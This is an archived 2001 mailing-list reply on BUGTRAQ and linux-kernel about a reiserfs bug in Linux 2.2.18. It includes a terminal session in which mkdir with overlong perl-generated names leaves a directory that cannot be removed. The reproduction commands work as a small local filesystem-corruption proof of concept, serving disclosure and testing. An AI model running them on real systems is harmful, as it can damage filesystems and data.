Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S129826AbRAJGC7>; Wed, 10 Jan 2001 01:02:59 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S129764AbRAJGCu>; Wed, 10 Jan 2001 01:02:50 -0500
Received: from chao.ucsd.edu ([132.239.50.139]:19166 "HELO chao.ucsd.edu")
	by vger.kernel.org with SMTP id <S129431AbRAJGCk>;
	Wed, 10 Jan 2001 01:02:40 -0500
Date: Tue, 9 Jan 2001 22:02:37 -0800
From: "John H. Robinson, IV" <jhriv@ucsd.edu>
To: BUGTRAQ@SECURITYFOCUS.COM
Cc: linux-kernel@vger.kernel.org, reiserfs-list@namesys.com
Subject: Re: [BUGTRAQ] major security bug in reiserfs (may affect SuSE Linux)
Message-ID: <20010109220237.D23132@ucsd.edu>
Mail-Followup-To: BUGTRAQ@SECURITYFOCUS.COM, linux-kernel@vger.kernel.org,
	reiserfs-list@namesys.com
In-Reply-To: <20010110004201.A308@cerebro.laendle>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <20010110004201.A308@cerebro.laendle>; from pcg@GOOF.COM on Wed, Jan 10, 2001 at 12:42:01AM +0100
X-ddate: Today is Prickle-Prickle, the 9th day of Chaos in the YOLD 3167
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On Wed, Jan 10, 2001 at 12:42:01AM +0100, Marc Lehmann wrote:
> 
> Basically, you do:
> 
> mkdir "$(perl -e 'print "x" x 768')"

[jaqque@osiris:/tmp/chk]% uname -a            
Linux osiris 2.2.18 [classified] Sat Jan 6 11:19:04 PST 2001 i586 unknown
[jaqque@osiris:/tmp/chk]% mkdir "$(perl -e 'print "x" x 768')"
[jaqque@osiris:/tmp/chk]% ls -la
total 2
drwxrwxr-x    3 jaqque   jaqque        819 Jan  9 21:55 .
drwxrwxrwt   10 root     root          371 Jan  9 21:54 ..
drwxrwxr-x    2 jaqque   jaqque         35 Jan  9 21:55 x...
[jaqque@osiris:/tmp/chk]% rm -rf x*
[jaqque@osiris:/tmp/chk]% mkdir "$(perl -e 'print "x" x 4033')"
mkdir: cannot create directory `x....x': File name too long
[jaqque@osiris:/tmp/chk]% mkdir "$(perl -e 'print "x" x 4032')"
[jaqque@osiris:/tmp/chk]% rm -rf x*
[jaqque@osiris:/tmp/chk]% mkdir "$(perl -e 'print "x" x 4032')"
mkdir: cannot create directory `x....x': File exists
zsh: exit 255   mkdir "$(perl -e 'print "x" x 4032')"
[jaqque@osiris:/tmp/chk]% ls -la
total 4
drwxrwxr-x    3 jaqque   jaqque       4083 Jan  9 21:56 .
drwxrwxrwt   10 root     root          371 Jan  9 21:54 ..
[jaqque@osiris:/tmp/chk]% 


no oops, but a directory that cannot be removed.

-john

linux kernel 2.2.18 with reiserfs-3.5.29 patch
-
To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
the body of a message to majordomo@vger.kernel.org
Please read the FAQ at http://www.tux.org/lkml/
